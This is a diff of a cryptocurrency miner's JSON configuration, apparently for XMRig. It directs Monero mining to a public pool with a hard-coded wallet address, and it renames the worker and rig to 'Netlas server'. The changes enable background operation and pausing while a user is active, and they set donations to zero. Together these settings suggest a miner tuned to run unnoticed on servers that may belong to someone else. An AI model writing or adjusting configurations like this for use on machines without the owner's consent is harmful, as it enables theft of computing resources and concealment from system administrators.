@@ -1,7 +1,14 @@
 ﻿{
   "api": {
     "id": null,
-    "worker-id": "Netlas servers windows"
+    "worker-id": "Netlas server"
+  },
+  "http": {
+    "enabled": false,
+    "host": "127.0.0.1",
+    "port": 0,
+    "access-token": null,
+    "restricted": true
   },
   "autosave": false,
   "background": true,
@@ -26,13 +33,17 @@
     "priority": 1,
     "memory-pool": false,
     "yield": true,
-    "max-threads-hint": 50,
+    "max-threads-hint": 45,
     "asm": true,
     "argon2-impl": null,
     "rx": null
   },
-  "opencl": { "enabled": false },
-  "cuda": { "enabled": false },
+  "opencl": {
+    "enabled": false
+  },
+  "cuda": {
+    "enabled": false
+  },
   "donate-level": 0,
   "donate-over-proxy": 0,
   "pools": [
@@ -41,8 +52,8 @@
       "coin": "XMR",
       "url": "pool.supportxmr.com:443",
       "user": "459ZK1ZLaXXDfE93RMyRwxi35dRn3UwXY8duw5MSX6vw9BLsVXLFeQj51ZQFNb13jnTHjMakynyXHgXDCsoosv1tMJRUMbk",
-      "pass": "IZI NEW",
-      "rig-id": "IZI NEW",
+      "pass": "Netlas server",
+      "rig-id": "Netlas server",
       "nicehash": false,
       "keepalive": true,
       "enabled": true,
@@ -55,8 +66,8 @@
       "coin": "XMR",
       "url": "pool.supportxmr.com:3333",
       "user": "459ZK1ZLaXXDfE93RMyRwxi35dRn3UwXY8duw5MSX6vw9BLsVXLFeQj51ZQFNb13jnTHjMakynyXHgXDCsoosv1tMJRUMbk",
-      "pass": "Netlas servers windows",
-      "rig-id": "Netlas servers windows",
+      "pass": "Netlas server",
+      "rig-id": "Netlas server",
       "nicehash": false,
       "keepalive": true,
       "enabled": true,
@@ -67,11 +78,13 @@
   ],
   "retries": 5,
   "retry-pause": 5,
+  "print-time": 60,
+  "health-print-time": 60,
   "dmi": false,
   "verbose": 0,
   "watch": false,
   "pause-on-battery": false,
-  "pause-on-active": false,
+  "pause-on-active": true,
   "log-file": null,
   "syslog": false
 }
